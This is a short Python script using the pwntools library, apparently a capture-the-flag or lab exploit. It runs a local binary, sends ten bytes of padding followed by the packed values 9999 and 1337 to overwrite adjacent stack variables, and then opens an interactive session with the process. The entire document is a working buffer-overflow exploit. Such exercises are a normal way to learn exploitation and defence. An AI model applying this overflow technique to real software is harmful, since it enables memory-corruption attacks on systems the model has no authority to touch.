from pwn import *

p = process("./a.out")
payload=b"A"*10

a = 1337
b = 9999

payload += p32(b) + p32(a)

p.sendline(payload)
p.interactive()
